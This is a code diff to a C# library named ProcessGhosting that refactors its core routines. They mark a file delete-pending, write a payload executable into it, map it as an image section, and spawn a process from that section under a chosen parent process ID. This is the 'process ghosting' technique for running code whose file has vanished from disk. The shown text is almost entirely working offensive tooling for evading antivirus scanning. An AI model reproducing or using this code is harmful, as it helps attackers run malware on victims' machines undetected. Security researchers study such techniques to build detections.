@@ -8,86 +8,82 @@ namespace ProcessGhosting.Library
 
     internal class Utilities
     {
-        public static IntPtr CreateDeletePendingFileSection(
-            string tmpFilePath,
-            byte[] payload)
+        public static IntPtr CreateDeletePendingFileSection(string tmpFilePath, byte[] payload)
         {
             NTSTATUS ntstatus;
             IntPtr hDeletePendingFile;
-            IntPtr pIoStatusBlock;
+            IntPtr hSection = Win32Consts.INVALID_HANDLE_VALUE;
             int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));
-
-            hDeletePendingFile = OpenDeletePendingFile(tmpFilePath);
-
-            if (hDeletePendingFile == Win32Consts.INVALID_HANDLE_VALUE)
-                return Win32Consts.INVALID_HANDLE_VALUE;
-
-            pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
+            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
             var fileDispositionInfo = new FILE_DISPOSITION_INFORMATION(true);
 
-            ntstatus = NativeMethods.NtSetInformationFile(
-                hDeletePendingFile,
-                pIoStatusBlock,
-                in fileDispositionInfo,
-                (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFORMATION)),
-                FILE_INFORMATION_CLASS.FileDispositionInformation);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
+            do
             {
-                Console.WriteLine("[-] Failed to set information to file.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-                Marshal.FreeHGlobal(pIoStatusBlock);
+                hDeletePendingFile = OpenDeletePendingFile(tmpFilePath);
+
+                if (hDeletePendingFile == Win32Consts.INVALID_HANDLE_VALUE)
+                    break;
+
+                ntstatus = NativeMethods.NtSetInformationFile(
+                    hDeletePendingFile,
+                    pIoStatusBlock,
+                    in fileDispositionInfo,
+                    (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFORMATION)),
+                    FILE_INFORMATION_CLASS.FileDispositionInformation);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to set information to file.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    break;
+                }
+
+                ntstatus = NativeMethods.NtWriteFile(
+                    hDeletePendingFile,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    pIoStatusBlock,
+                    payload,
+                    (uint)payload.Length,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    Console.WriteLine("[-] Failed to write image data to file.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                    break;
+                }
+
+                ntstatus = NativeMethods.NtCreateSection(
+                    out hSection,
+                    ACCESS_MASK.SECTION_ALL_ACCESS,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    SECTION_PROTECTIONS.PAGE_READONLY,
+                    SECTION_ATTRIBUTES.SEC_IMAGE,
+                    hDeletePendingFile);
                 NativeMethods.NtClose(hDeletePendingFile);
 
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                {
+                    hSection = Win32Consts.INVALID_HANDLE_VALUE;
+                    Console.WriteLine("[-] Failed to create section in delete pending file.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                }
+            } while (false);
 
-            ntstatus = NativeMethods.NtWriteFile(
-                hDeletePendingFile,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                pIoStatusBlock,
-                payload,
-                (uint)payload.Length,
-                IntPtr.Zero,
-                IntPtr.Zero);
             Marshal.FreeHGlobal(pIoStatusBlock);
 
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to write image data to file.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+            if (hDeletePendingFile != Win32Consts.INVALID_HANDLE_VALUE)
                 NativeMethods.NtClose(hDeletePendingFile);
-
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
-
-            ntstatus = NativeMethods.NtCreateSection(
-                out IntPtr hSection,
-                ACCESS_MASK.SECTION_ALL_ACCESS,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                SECTION_PROTECTIONS.PAGE_READONLY,
-                SECTION_ATTRIBUTES.SEC_IMAGE,
-                hDeletePendingFile);
-            NativeMethods.NtClose(hDeletePendingFile);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create section in delete pending file.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return Win32Consts.INVALID_HANDLE_VALUE;
-            }
 
             return hSection;
         }
 
 
-        public static IntPtr CreateDeletePendingProcess(
-            IntPtr hDeletePendingSection,
-            int ppid)
+        public static IntPtr CreateGhostingProcess(IntPtr hDeletePendingSection, int ppid)
         {
             NTSTATUS ntstatus;
             IntPtr hParent;
@@ -134,10 +130,9 @@ namespace ProcessGhosting.Library
 
             if (ntstatus != Win32Consts.STATUS_SUCCESS)
             {
-                Console.WriteLine("[-] Failed to create delete pending process.");
+                hDeletePendingProcess = IntPtr.Zero;
+                Console.WriteLine("[-] Failed to create ghosting process.");
                 Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-
-                return IntPtr.Zero;
             }
 
             return hDeletePendingProcess;
@@ -193,11 +188,10 @@ namespace ProcessGhosting.Library
         {
             NTSTATUS ntstatus;
             string ntFilePath = string.Format(@"\??\{0}", filePath);
+            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
             var objectAttributes = new OBJECT_ATTRIBUTES(
                 ntFilePath,
                 OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE);
-            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(
-                Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
 
             ntstatus = NativeMethods.NtOpenFile(
                 out IntPtr hFile,
